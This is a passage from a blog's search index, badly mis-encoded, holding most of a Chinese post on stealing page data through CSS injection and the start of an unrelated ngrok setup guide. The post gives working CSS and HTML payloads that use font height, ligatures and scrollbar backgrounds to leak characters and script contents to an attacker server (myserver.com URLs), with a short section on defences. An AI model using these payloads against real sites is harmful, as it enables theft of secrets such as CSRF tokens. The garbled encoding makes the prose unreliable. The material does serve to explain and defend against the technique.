MSã€çš„å­—é«”ï¼Œé«˜åº¦å°±æ¯”å¦ä¸€å€‹ã€ŒCourier Newã€é«˜ã€‚\nèˆ‰å€‹ä¾‹å­ï¼Œå‡è¨­é è¨­å­—é«”çš„é«˜åº¦æ˜¯ 30pxï¼Œè€Œ Comic Sans MS æ˜¯ 45px å¥½äº†ã€‚é‚£ç¾åœ¨æˆ‘å€‘æŠŠæ–‡å­—å€å¡Šçš„é«˜åº¦è¨­æˆ 40pxï¼Œä¸¦ä¸”è¼‰å…¥å­—é«”ï¼Œåƒé€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;fa\u0026#34;; src:local(\u0026#39;Comic Sans MS\u0026#39;); font-style:monospace; unicode-range: U+41; } div { font-size: 30px; height: 40px; width: 100px; font-family: fa, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;DBC\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;ABC\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å°±æœƒåœ¨ç•«é¢ä¸Šçœ‹åˆ°å·®ç•°ï¼š\nå¾ˆæ˜é¡¯ A æ¯”å…¶ä»–å­—å…ƒçš„é«˜åº¦éƒ½é«˜ï¼Œè€Œä¸”æ ¹æ“šæˆ‘å€‘çš„ CSS è¨­å®šï¼Œå¦‚æœå…§å®¹é«˜åº¦è¶…éå®¹å™¨é«˜åº¦ï¼Œæœƒå‡ºç¾ scrollbarã€‚é›–ç„¶ä¸Šé¢æ˜¯æˆªåœ–çœ‹ä¸å‡ºä¾†ï¼Œä½†æ˜¯ä¸‹é¢çš„ ABC æœ‰å‡ºç¾ scrollbarï¼Œè€Œä¸Šé¢çš„ DBC æ²’æœ‰ã€‚\nå†è€…ï¼Œæˆ‘å€‘å…¶å¯¦å¯ä»¥å¹« scrollbar è¨­å®šä¸€å€‹å¤–éƒ¨çš„èƒŒæ™¯ï¼š\n1 2 3 4 5 6 7 div::-webkit-scrollbar { background: blue; } div::-webkit-scrollbar:vertical { background: url(https://myserver.com?q=a); } ä¹Ÿå°±æ˜¯èªªï¼Œå¦‚æœ scrollbar æœ‰å‡ºç¾ï¼Œæˆ‘å€‘çš„ server å°±æœƒæ”¶åˆ° requestã€‚å¦‚æœ scrollbar æ²’å‡ºç¾ï¼Œå°±ä¸æœƒæ”¶åˆ° requestã€‚\næ›´é€²ä¸€æ­¥ä¾†èªªï¼Œç•¶æˆ‘æŠŠ div å¥—ç”¨ â€œfaâ€ å­—é«”æ™‚ï¼Œå¦‚æœç•«é¢ä¸Šæœ‰ Aï¼Œå°±æœƒå‡ºç¾ scrollbarï¼Œserver å°±æœƒæ”¶åˆ° requestã€‚å¦‚æœç•«é¢ä¸Šæ²’æœ‰ Aï¼Œå°±ä»€éº¼äº‹æƒ…éƒ½ä¸æœƒç™¼ç”Ÿã€‚\nå› æ­¤ï¼Œæˆ‘å¦‚æœä¸€ç›´é‡è¤‡è¼‰å…¥ä¸åŒå­—é«”ï¼Œé‚£æˆ‘åœ¨ server å°±èƒ½çŸ¥é“ç•«é¢ä¸Šæœ‰ä»€éº¼å­—å…ƒï¼Œé€™é»è·Ÿå‰›å‰›æˆ‘å€‘ç”¨ unicode-range èƒ½åšåˆ°çš„äº‹æƒ…æ˜¯ä¸€æ¨£çš„ã€‚\né‚£è¦æ€éº¼è§£æ±ºé †åºçš„å•é¡Œå‘¢ï¼Ÿ\næˆ‘å€‘å¯ä»¥å…ˆæŠŠ div çš„å¯¬åº¦ç¸®æ¸›åˆ°åªèƒ½é¡¯ç¤ºä¸€å€‹å­—å…ƒï¼Œé€™æ¨£å…¶ä»–å­—å…ƒå°±æœƒè¢«æ”¾åˆ°ç¬¬äºŒè¡Œå»ï¼Œå†æ­é… ::first-line é€™å€‹ selectorï¼Œå°±å¯ä»¥ç‰¹åˆ¥é‡å°ç¬¬ä¸€è¡Œåšæ¨£å¼çš„èª¿æ•´ï¼Œåƒæ˜¯é€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;fa\u0026#34;; src:local(\u0026#39;Comic Sans MS\u0026#39;); font-style:monospace; unicode-range: U+41; } div { font-size: 0px; height: 40px; width: 20px; font-family: fa, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; } div::first-line{ font-size: 30px; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;CBAD\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ç•«é¢ä¸Šä½ å°±åªæœƒçœ‹åˆ°ä¸€å€‹ã€ŒCã€çš„å­—å…ƒï¼Œå› ç‚ºæˆ‘å€‘å…ˆç”¨ font-size: 0px æŠŠæ‰€æœ‰å­—å…ƒçš„å°ºå¯¸éƒ½è¨­ç‚º 0ï¼Œå†ç”¨ div::first-line å»åšèª¿æ•´ï¼Œè®“ç¬¬ä¸€è¡Œçš„ font-size è®Šæˆ 30pxã€‚æ›å¥è©±èªªï¼Œåªæœ‰ç¬¬ä¸€è¡Œçš„å­—å…ƒèƒ½çœ‹åˆ°ï¼Œè€Œç¾åœ¨çš„ div å¯¬åº¦åªæœ‰ 20pxï¼Œæ‰€ä»¥åªæœƒå‡ºç¾ç¬¬ä¸€å€‹å­—å…ƒã€‚\næ¥è‘—ï¼Œæˆ‘å€‘å†é‹ç”¨å‰›å‰›å­¸æœƒçš„é‚£æ‹›ï¼Œå»è¼‰å…¥çœ‹çœ‹ä¸åŒçš„å­—é«”ã€‚ç•¶æˆ‘è¼‰å…¥ fa é€™å€‹å­—é«”æ™‚ï¼Œå› ç‚ºç•«é¢ä¸Šæ²’æœ‰å‡ºç¾ Aï¼Œæ‰€ä»¥ä¸æœƒæœ‰ä»»ä½•è®ŠåŒ–ã€‚ä½†æ˜¯ç•¶æˆ‘è¼‰å…¥ fc é€™å€‹å­—é«”æ™‚ï¼Œç•«é¢ä¸Šæœ‰ Cï¼Œæ‰€ä»¥å°±æœƒç”¨ Comic Sans MS ä¾†é¡¯ç¤º Cï¼Œé«˜åº¦å°±æœƒè®Šé«˜ï¼Œscrollbar å°±æœƒå‡ºç¾ï¼Œå°±å¯ä»¥åˆ©ç”¨å®ƒä¾†ç™¼å‡º requestï¼Œåƒé€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 div { font-size: 0px; height: 40px; width: 20px; font-family: fc, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; --leak: url(http://myserver.com?C); } div::first-line{ font-size: 30px; } div::-webkit-scrollbar { background: blue; } div::-webkit-scrollbar:vertical { background: var(--leak); } é‚£æˆ‘å€‘è¦æ€éº¼æ¨£ä¸æ–·ä½¿ç”¨æ–°çš„ font-family å‘¢ï¼Ÿç”¨ CSS animation å°±å¯ä»¥åšåˆ°ï¼Œä½ å¯ä»¥ç”¨ CSS animation ä¸æ–·è¼‰å…¥ä¸åŒçš„ font-family ä»¥åŠæŒ‡å®šä¸åŒçš„ â€“leak è®Šæ•¸ã€‚\nå¦‚æ­¤ä¸€ä¾†ï¼Œæˆ‘å€‘å°±èƒ½çŸ¥é“ç•«é¢ä¸Šçš„ç¬¬ä¸€å€‹å­—å…ƒåˆ°åº•æ˜¯ä»€éº¼ã€‚\nçŸ¥é“äº†ç¬¬ä¸€å€‹å­—å…ƒä»¥å¾Œï¼Œæˆ‘å€‘æŠŠ div çš„å¯¬åº¦è®Šé•·ï¼Œä¾‹å¦‚èªªè®Šæˆ 40pxï¼Œå°±èƒ½å®¹ç´å…©å€‹å­—å…ƒï¼Œå› æ­¤ç¬¬ä¸€è¡Œå°±æœƒæ˜¯å‰å…©å€‹å­—ï¼Œæ¥è‘—å†ç”¨ä¸€æ¨£çš„æ–¹å¼è¼‰å…¥ä¸åŒçš„ font-familyï¼Œå°±èƒ½ leak å‡ºç¬¬äºŒå€‹å­—å…ƒï¼Œè©³ç´°æµç¨‹å¦‚ä¸‹ï¼š\nå‡è¨­ç•«é¢ä¸Šæ˜¯ ACB èª¿æ•´å¯¬åº¦ç‚º 20pxï¼Œç¬¬ä¸€è¡Œåªå‡ºç¾ç¬¬ä¸€å€‹å­—å…ƒ A è¼‰å…¥å­—é«” faï¼Œå› æ­¤ A ç”¨è¼ƒé«˜çš„å­—é«”é¡¯ç¤ºï¼Œå‡ºç¾ scrollbarï¼Œè¼‰å…¥ scrollbar èƒŒæ™¯ï¼Œå‚³é€ request çµ¦ server è¼‰å…¥å­—é«” fbï¼Œä½†æ˜¯ B æ²’æœ‰å‡ºç¾åœ¨ç•«é¢ä¸Šï¼Œå› æ­¤æ²’æœ‰ä»»ä½•è®ŠåŒ–ã€‚ è¼‰å…¥å­—é«” fcï¼Œä½†æ˜¯ C æ²’æœ‰å‡ºç¾åœ¨ç•«é¢ä¸Šï¼Œå› æ­¤æ²’æœ‰ä»»ä½•è®ŠåŒ–ã€‚ èª¿æ•´å¯¬åº¦ç‚º 40pxï¼Œç¬¬ä¸€è¡Œå‡ºç¾å…©å€‹å­—å…ƒ AC è¼‰å…¥å­—é«” faï¼Œå› æ­¤ A ç”¨è¼ƒé«˜çš„å­—é«”é¡¯ç¤ºï¼Œå‡ºç¾ scrollbarï¼Œæ­¤æ™‚æ‡‰è©²æ˜¯å› ç‚ºé€™å€‹èƒŒæ™¯å·²ç¶“è¼‰å…¥éï¼Œæ‰€ä»¥ä¸æœƒç™¼é€æ–°çš„ request è¼‰å…¥å­—é«” fbï¼Œæ²’å‡ºç¾åœ¨ç•«é¢ä¸Šï¼Œæ²’ä»»ä½•è®ŠåŒ– è¼‰å…¥å­—é«” fcï¼ŒC ç”¨è¼ƒé«˜çš„å­—é«”é¡¯ç¤ºï¼Œå‡ºç¾ scrollbar ä¸¦ä¸”è¼‰å…¥èƒŒæ™¯ èª¿æ•´å¯¬åº¦ç‚º 60pxï¼ŒACB ä¸‰å€‹å­—å…ƒéƒ½å‡ºç¾åœ¨ç¬¬ä¸€è¡Œ è¼‰å…¥å­—é«” faï¼ŒåŒç¬¬ä¸ƒæ­¥ è¼‰å…¥å­—é«” fbï¼ŒB ç”¨è¼ƒé«˜çš„å­—é«”é¡¯ç¤ºï¼Œå‡ºç¾ scrollbar ä¸¦ä¸”è¼‰å…¥èƒŒæ™¯ è¼‰å…¥å­—é«” fcï¼ŒC ç”¨è¼ƒé«˜çš„å­—é«”é¡¯ç¤ºï¼Œä½†å› ç‚ºå·²ç¶“è¼‰å…¥éç›¸åŒèƒŒæ™¯ï¼Œä¸æœƒç™¼é€ request çµæŸ å¾ä¸Šé¢æµç¨‹ä¸­å¯ä»¥çœ‹å‡º server æœƒä¾åºæ”¶åˆ° A, C, B ä¸‰å€‹ reqeustï¼Œä»£è¡¨äº†ç•«é¢ä¸Šå­—å…ƒçš„é †åºã€‚è€Œä¸æ–·æ”¹è®Šå¯¬åº¦ä»¥åŠ font-family éƒ½å¯ä»¥ç”¨ CSS animation åšåˆ°ã€‚\næƒ³è¦çœ‹å®Œæ•´ demo çš„å¯ä»¥çœ‹é€™å€‹ç¶²é ï¼ˆå‡ºè™•ï¼šWhat can we do with single CSS injection?ï¼‰ï¼šhttps://demo.vwzq.net/css2.html\né€™å€‹è§£æ³•é›–ç„¶è§£æ±ºäº†ã€Œä¸çŸ¥é“å­—å…ƒé †åºã€çš„å•é¡Œï¼Œä½†ä¾ç„¶ç„¡æ³•è§£æ±ºé‡è¤‡å­—å…ƒçš„å•é¡Œï¼Œå› ç‚ºé‡è¤‡çš„å­—å…ƒä¸æœƒå†ç™¼å‡º requestã€‚\nå¤§çµ•æ‹›ï¼šligature + scrollbar å…ˆè¬›çµè«–ï¼Œé€™ä¸€æ‹›å¯ä»¥è§£æ±ºä¸Šé¢æ‰€æœ‰å•é¡Œï¼Œé”æˆã€ŒçŸ¥é“å­—å…ƒé †åºï¼Œä¹ŸçŸ¥é“é‡è¤‡å­—å…ƒã€çš„ç›®æ¨™ï¼Œèƒ½å¤ å·åˆ°å®Œæ•´çš„æ–‡å­—ã€‚\nè¦ç†è§£æ€éº¼å·ä¹‹å‰ï¼Œæˆ‘å€‘è¦å…ˆçŸ¥é“ä¸€å€‹å°ˆæœ‰åè©ï¼Œå«åšé€£å­—ï¼ˆligatureï¼‰ï¼Œåœ¨æŸäº›å­—å‹ç•¶ä¸­ï¼ŒæœƒæŠŠä¸€äº›ç‰¹å®šçš„çµ„åˆ render æˆé€£åœ¨ä¸€èµ·çš„æ¨£å­ï¼Œå¦‚ä¸‹åœ–ï¼ˆä¾†æºï¼šwikipediaï¼‰ï¼š\né‚£é€™å€‹å°æˆ‘å€‘æœ‰ä»€éº¼å¹«åŠ©å‘¢ï¼Ÿ\næˆ‘å€‘å¯ä»¥è‡ªå·±è£½ä½œå‡ºä¸€å€‹ç¨ç‰¹çš„å­—é«”ï¼ŒæŠŠ ab è¨­å®šæˆé€£å­—ï¼Œä¸¦ä¸” render å‡ºä¸€å€‹è¶…å¯¬çš„å…ƒç´ ã€‚æ¥è‘—ï¼Œæˆ‘å€‘æŠŠæŸå€‹ div å¯¬åº¦è¨­æˆå›ºå®šï¼Œç„¶å¾Œçµåˆå‰›å‰› scrollbar é‚£æ‹›ï¼Œä¹Ÿå°±æ˜¯ï¼šã€Œå¦‚æœ ab æœ‰å‡ºç¾ï¼Œå°±æœƒè®Šå¾ˆå¯¬ï¼Œscrollbar å°±æœƒå‡ºç¾ï¼Œå°±å¯ä»¥è¼‰å…¥ request å‘Šè¨´ serverï¼›å¦‚æœæ²’å‡ºç¾ï¼Œé‚£ scrollbar å°±ä¸æœƒå‡ºç¾ï¼Œæ²’æœ‰ä»»ä½•äº‹æƒ…ç™¼ç”Ÿã€ã€‚\næµç¨‹æ˜¯é€™æ¨£çš„ï¼Œå‡è¨­ç•«é¢ä¸Šæœ‰ acc é€™ä¸‰å€‹å­—ï¼š\nè¼‰å…¥æœ‰é€£å­— aa çš„å­—é«”ï¼Œæ²’äº‹ç™¼ç”Ÿ è¼‰å…¥æœ‰é€£å­— ab çš„å­—é«”ï¼Œæ²’äº‹ç™¼ç”Ÿ è¼‰å…¥æœ‰é€£å­— ac çš„å­—é«”ï¼ŒæˆåŠŸ render è¶…å¯¬çš„ç•«é¢ï¼Œscrollbar å‡ºç¾ï¼Œè¼‰å…¥ server åœ–ç‰‡ server çŸ¥é“ç•«é¢ä¸Šæœ‰ ac è¼‰å…¥æœ‰é€£å­— aca çš„å­—é«”ï¼Œæ²’äº‹ç™¼ç”Ÿ è¼‰å…¥æœ‰é€£å­— acb çš„å­—é«”ï¼Œæ²’äº‹ç™¼ç”Ÿ è¼‰å…¥æœ‰é€£å­— acc çš„å­—é«”ï¼ŒæˆåŠŸ renderï¼Œscrollbar å‡ºç¾ï¼Œå‚³é€çµæœçµ¦ server server çŸ¥é“ç•«é¢ä¸Šæœ‰ aca é€éé€£å­—çµåˆ scrollbarï¼Œæˆ‘å€‘å¯ä»¥ä¸€å€‹å­—å…ƒä¸€å€‹å­—å…ƒï¼Œæ…¢æ…¢ leak å‡ºç•«é¢ä¸Šæ‰€æœ‰çš„å­—ï¼Œç”šè‡³é€£ JavaScript çš„ç¨‹å¼ç¢¼éƒ½å¯ä»¥ï¼\nä½ çŸ¥é“ï¼Œscript çš„å…§å®¹æ˜¯å¯ä»¥é¡¯ç¤ºåœ¨ç•«é¢ä¸Šçš„å—ï¼Ÿ\n1 2 3 head, script { display: block; } åªè¦åŠ ä¸Šé€™å€‹ CSSï¼Œå°±å¯ä»¥è®“ script å…§å®¹ä¹Ÿé¡¯ç¤ºåœ¨ç•«é¢ä¸Šï¼Œå› æ­¤æˆ‘å€‘ä¹Ÿå¯ä»¥åˆ©ç”¨åŒæ¨£çš„æŠ€å·§ï¼Œå·åˆ° script çš„å…§å®¹ï¼\nåœ¨å¯¦æˆ°ä¸Šçš„è©±ï¼Œä½ å¯ä»¥ç”¨ SVG æ­é…å…¶ä»–å·¥å…·ï¼Œåœ¨ server ç«¯è¿…é€Ÿç”¢ç”Ÿå­—é«”ï¼Œæƒ³è¦çœ‹ç´°ç¯€ä»¥åŠç›¸é—œç¨‹å¼ç¢¼çš„è©±ï¼Œå¯ä»¥åƒè€ƒé€™ç¯‡ï¼šStealing Data in Great style â€“ How to Use CSS to Attack Web Application.\nè€Œé€™é‚Šæˆ‘å°±ç°¡å–®åšå€‹ç°¡åŒ–åˆ°ä¸è¡Œçš„ demoï¼Œä¾†è­‰æ˜é€™ä»¶äº‹æƒ…æ˜¯å¯è¡Œçš„ã€‚ç‚ºäº†ç°¡åŒ–ï¼Œæœ‰äººåšäº†ä¸€å€‹ Safari ç‰ˆæœ¬çš„ demoï¼Œå› ç‚º Safari æ”¯æ´ SVG fontï¼Œæ‰€ä»¥ä¸éœ€è¦å†å¾ server ç”¢ç”Ÿå­—å‹ï¼ŒåŸå§‹æ–‡ç« åœ¨é€™è£¡ï¼šData Exfiltration via CSS + SVG Font - PoC (Safari only)\nç°¡æ˜“ç‰ˆ demoï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var secret = \u0026#34;abc123\u0026#34; \u0026lt;/script\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;script\u0026gt; var secret2 = \u0026#34;cba321\u0026#34; \u0026lt;/script\u0026gt; \u0026lt;svg\u0026gt; \u0026lt;defs\u0026gt; \u0026lt;font horiz-adv-x=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;font-face font-family=\u0026#34;hack\u0026#34; units-per-em=\u0026#34;1000\u0026#34; /\u0026gt; \u0026lt;glyph unicode=\u0026#39;\u0026#34;a\u0026#39; horiz-adv-x=\u0026#34;99999\u0026#34; d=\u0026#34;M1 0z\u0026#34;/\u0026gt; \u0026lt;/font\u0026gt; \u0026lt;/defs\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;style\u0026gt; script { display: block; font-family:\u0026#34;hack\u0026#34;; white-space:n owrap; overflow-x: auto; width: 500px; background:lightblue; } script::-webkit-scrollbar { background: blue; } \u0026lt;/style\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; æˆ‘ç”¨ script æ”¾äº†å…©æ®µ JSï¼Œè£¡é¢å…§å®¹åˆ†åˆ¥æ˜¯ var secret = \u0026quot;abc123\u0026quot; è·Ÿ var secret2 = \u0026quot;cba321\u0026quot;ï¼Œæ¥è‘—åˆ©ç”¨ CSS è¼‰å…¥æˆ‘æº–å‚™å¥½çš„å­—é«”ï¼Œåªè¦æœ‰ \u0026quot;a çš„é€£å­—ï¼Œå°±æœƒå¯¬åº¦è¶…å¯¬ã€‚\nå†ä¾†å¦‚æœ scrollbar æœ‰å‡ºç¾ï¼Œæˆ‘æŠŠèƒŒæ™¯è¨­æˆè—è‰²çš„ï¼Œæ¯”è¼ƒé¡¯çœ¼ï¼Œæœ€å¾Œçš„çµæœå¦‚ä¸‹ï¼š\nä¸Šé¢å› ç‚ºå…§å®¹æ˜¯ var secret = \u0026quot;abc123\u0026quot;ï¼Œæ‰€ä»¥ç¬¦åˆäº† \u0026ldquo;a çš„é€£å­—ï¼Œå› æ­¤å¯¬åº¦è®Šå¯¬ï¼Œscrollbar å‡ºç¾ã€‚\nä¸‹é¢å› ç‚ºæ²’æœ‰ \u0026quot;aï¼Œæ‰€ä»¥ scrollbar æ²’å‡ºç¾ï¼ˆæœ‰ a çš„åœ°æ–¹éƒ½æœƒç¼ºå­—ï¼Œæ‡‰è©²è·Ÿæˆ‘æ²’æœ‰å®šç¾©å…¶ä»–çš„ glyph æœ‰é—œï¼Œä½†ä¸å½±éŸ¿çµæœï¼‰\nåªè¦æŠŠ scrollbar çš„èƒŒæ™¯æ›æˆ URLï¼Œå°±å¯ä»¥å¾ server ç«¯çŸ¥é“ leak çš„çµæœã€‚\nå¦‚æœæƒ³çœ‹å¯¦éš›çš„ demo è·Ÿ server ç«¯çš„å¯«æ³•ï¼Œå¯ä»¥åƒè€ƒä¸Šé¢é™„çš„é‚£å…©ç¯‡æ–‡ç« ã€‚\né˜²ç¦¦æ–¹å¼ æœ€å¾Œæˆ‘å€‘ä¾†è¬›ä¸€ä¸‹é˜²ç¦¦æ–¹å¼ï¼Œæœ€ç°¡å–®æ˜ç­çš„ç•¶ç„¶å°±æ˜¯ç›´æ¥æŠŠ style å°èµ·ä¾†ä¸çµ¦ç”¨ï¼ŒåŸºæœ¬ä¸Šå°±ä¸æœƒæœ‰ CSS injection çš„å•é¡Œï¼ˆé™¤éå¯¦ä½œæ–¹å¼æœ‰æ¼æ´ï¼‰ã€‚\nå¦‚æœçœŸçš„è¦é–‹æ”¾ styleï¼Œä¹Ÿå¯ä»¥ç”¨ CSP ä¾†é˜»æ“‹ä¸€äº›è³‡æºçš„è¼‰å…¥ï¼Œä¾‹å¦‚èªª font-src å°±æ²’æœ‰å¿…è¦å…¨é–‹ï¼Œstyle-src ä¹Ÿå¯ä»¥è¨­ç½® allow listï¼Œå°±èƒ½å¤ æ“‹ä½ @import é€™å€‹èªæ³•ã€‚\nå†ä¾†ï¼Œä¹Ÿå¯ä»¥è€ƒæ…®åˆ°ã€Œå¦‚æœé é¢ä¸Šçš„æ±è¥¿è¢«æ‹¿èµ°ï¼Œæœƒç™¼ç”Ÿä»€éº¼äº‹æƒ…ã€ï¼Œä¾‹å¦‚èªª CSRF token è¢«æ‹¿èµ°ï¼Œæœ€å£å°±æ˜¯ CSRFï¼Œæ­¤æ™‚å°±å¯ä»¥å¯¦ä½œæ›´å¤šçš„é˜²è­·å»é˜»æ“‹ CSRFï¼Œå°±ç®—æ”»æ“Šè€…å–å¾—äº† CSRF tokenï¼Œä¹Ÿæ²’è¾¦æ³• CSRFï¼ˆä¾‹å¦‚èªªå¤šæª¢æŸ¥ origin header ä¹‹é¡çš„ï¼‰ã€‚\nç¸½çµ CSS æœçœŸåšå¤§ç²¾æ·±ï¼ŒçœŸçš„å¾ˆä½©æœé€™äº›å‰è¼©å€‘å¯ä»¥æŠŠ CSS ç©å‡ºé€™éº¼å¤šèŠ±æ¨£ï¼Œç™¼å±•å‡ºé€™éº¼å¤šä»¤äººçœ¼ç•Œå¤§é–‹çš„æ”»æ“Šæ‰‹æ³•ã€‚ç•¶åˆåœ¨ç ”ç©¶çš„æ™‚å€™ï¼Œåˆ©ç”¨å±¬æ€§é¸æ“‡å™¨å» leak é€™å€‹æˆ‘å¯ä»¥ç†è§£ï¼Œç”¨ unicode-range æˆ‘ä¹Ÿèƒ½ç†è§£ï¼Œä½†æ˜¯é‚£å€‹ç”¨æ–‡å­—é«˜åº¦åŠ ä¸Š CSS animation å»è®ŠåŒ–çš„ï¼Œæˆ‘èŠ±äº†ä¸å°‘æ™‚é–“æ‰ææ‡‚é‚£åœ¨å¹¹å˜›ï¼Œé€£å­—é‚£å€‹é›–ç„¶æ¦‚å¿µå¥½æ‡‚ï¼Œä½†çœŸçš„è¦å¯¦ä½œé‚„æ˜¯æœƒç¢°åˆ°ä¸å°‘å•é¡Œã€‚\næœ€å¾Œï¼Œé€™å…©ç¯‡æ–‡ç« ä¸»è¦ç®—æ˜¯ä»‹ç´¹ä¸€ä¸‹ CSS injection é€™å€‹æ”»æ“Šæ‰‹æ³•ï¼Œå› æ­¤å¯¦éš›çš„ç¨‹å¼ç¢¼ä¸¦ä¸å¤šï¼Œè€Œé€™äº›æ”»æ“Šæ‰‹æ³•éƒ½åƒè€ƒè‡ªå‰äººå€‘çš„æ–‡ç« ï¼Œåˆ—è¡¨æˆ‘æœƒé™„åœ¨ä¸‹é¢ï¼Œæœ‰èˆˆè¶£çš„è©±å¯ä»¥é–±è®€åŸæ–‡ï¼Œæœƒè¬›å¾—æ›´è©³ç´°ä¸€é»ï¼Œå¦‚æœå°å“ªé …æ”»æ“Šæƒ³è¦æ·±å…¥äº†è§£ï¼Œä¹Ÿå¯ä»¥ç•™è¨€è·Ÿæˆ‘äº¤æµã€‚\n","date":"2022-10-03T00:00:00Z","image":"https://live.staticflickr.com/65535/52401028978_fc63caee61_o.jpg","permalink":"https://wayneblog.ga/2022-10-03/css-injection/","title":"ç”¨ CSS ä¾†å·è³‡æ–™ - CSS injection"},{"content":" åƒè€ƒæ–‡ç«  Alan Tsai çš„å­¸ç¿’ç­†è¨˜ Ngrokï¼šè®“æœ¬æ©Ÿæ¸¬è©¦æ™‚ä¹Ÿèƒ½æœ‰ HTTPS æ†‘è­‰ å‰è¨€ åœ¨é–‹ç™¼çš„éç¨‹ä¸­ï¼Œæœ‰æ™‚å€™æœƒéœ€è¦å¾å¦å¤–ä¸€è‡ºæ©Ÿå™¨æ¸¬è©¦åœ¨localçš„ç¶²ç«™åŠæœå‹™ã€‚æœ€å¸¸è¦‹çš„æƒ…æ³å°±æ˜¯ç•¶è¦æ¸¬è©¦ç¶²ç«™åœ¨æ‰‹æ©Ÿä¸Šçœ‹èµ·ä¾†é•·ä»€éº½æ¨£å­çš„æ™‚å€™ï¼Œæˆ–è€…æœ‰æ™‚å€™è¦è®“åˆ¥äººé€£åˆ°è‡ªå·±localçš„sql sererçš„æ™‚å€™ã€‚ ngrok å°±æ˜¯è®“é€™ä¸€åˆ‡è®Šå¾—å®¹æ˜“çš„å·¥å…·ï¼Œè€Œä¸”å¾ˆä½›å¿ƒçš„æ˜¯ï¼Œå…è²»ç‰ˆå°±å¤ ä¸€èˆ¬ä½¿ç”¨ã€‚ é‹ä½œæ¨¡å¼ ngrok å°±æ˜¯ä¸€å€‹ reverse proxy çš„å·¥å…·ï¼Œé€éæŠŠ local çš„ port map åˆ°ä¸€å€‹ public çš„åœ°å€ï¼Œè®“å¤–éƒ¨èƒ½å¤ é€éé€™å€‹ public åœ°å€é€£åˆ°ï¼Œç„¶å¾Œå·¥å…·ç”¨ reverse proxy å’Œ local å¯¦éš›çš„ port å–å¾—è³‡æ–™ã€‚ å› æ­¤æœ‰å€‹ç¼ºé»ï¼Œå°±æ˜¯é€Ÿåº¦ç›¸å°è¼ƒæ…¢ï¼Œå°¤å…¶æ˜¯ ngrok çš„ä¼ºæœå™¨åœ¨ç¾åœ‹å› æ­¤ä¹Ÿæœƒæ¸›å°‘ä¸€äº›é€Ÿåº¦ã€‚ä¸éå¦‚æœæ˜¯çˆ²äº†é–‹ç™¼æ¸¬è©¦ç”¨ï¼Œé€™å€‹å°±ä¸ç®—ç¼ºé»ã€‚ ngrok å…è²»ç‰ˆæœ¬æä¾›äº†ä¸€å€‹å‹•æ…‹çš„åœ°å€ï¼Œéœ€è¦é€²éšåŠŸèƒ½æˆ–è€…åŒæ™‚mapå¤šå€‹æœå‹™å°±éœ€è¦ä»˜è²»ã€‚ å®‰è£èˆ‡ä½¿ç”¨ éœ€å…ˆå®‰è£ unzip (è§£å£“ç¸®ç”¨) 1 yum install zip unzip æ­¥é©Ÿ 1 - åˆ°å®˜ç¶²ä¸‹è¼‰ç›¸å°æ‡‰ç³»çµ±çš„ ngrok å®‰è£åŒ… 1 2 ### ä»¥ linux 64 ç‚ºä¾‹ wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip æ­¥é©Ÿ 2 - è§£å£“ç¸®å®‰è£åŒ…ä¸¦æ¬ç§»åˆ° /usr/bin/ ä¸­ 1 unzip ngrok-stable-linux-amd64.zip 1 mv ngrok /usr/bin/. æ­¥é©Ÿ 3 - åˆ° ngrok å®˜ç¶²è¨»å†Šä¸€å€‹å…è²»å¸³è™Ÿ æ­¥é©Ÿ 4 - å°‡ dashboard ä¸Šé¡¯ç¤ºçš„ token è¨­å®šè‡³æœ¬æ©Ÿ 1 ngrok authtoken XXXXXXXXXXXXXXXX é¡¯ç¤ºæ­¤ç•«é¢ä»£è¡¨å·²è¨­å®šå®Œæˆã€‚ æ­¥é©Ÿ 5 - å‡è¨­æœå‹™è·‘åœ¨æœ¬æ©Ÿçš„ port 3000ï¼Œå‰‡åŸ·è¡Œä»¥ä¸‹æŒ‡ä»¤ 1 ngrok http 3000 é¡¯ç¤ºæ­¤ç•«é¢ä»£è¡¨å·²æˆåŠŸè·‘èµ·æœå‹™ï¼Œæ‰“é–‹ç¶²å€å³å¯ã€‚ ç›´åˆ° ngrok é—œæ‰æˆ– ngrok session éæœŸä¹‹å‰ï¼Œé€™å…©å€‹ URL éƒ½å¯ä»¥è¢«å…¬é–‹å­˜å–ã€‚ é€²éšä½¿ç”¨ å¤–é€£çš„ web æœå‹™åŠ å¯† æœ‰æ™‚å€™çµ¦åˆ¥äººæ¸¬è©¦çš„éˆæ¥ä¸å¸Œæœ›ä»»æ„çš„äººéƒ½èƒ½å¤ é–‹å•“ï¼Œngrokéå¸¸è²¼å¿ƒçš„æä¾›äº†é€™å€‹æœå‹™ã€‚ åªéœ€è¦åœ¨ mapping çš„æ™‚å€™åŠ ä¸Š auth 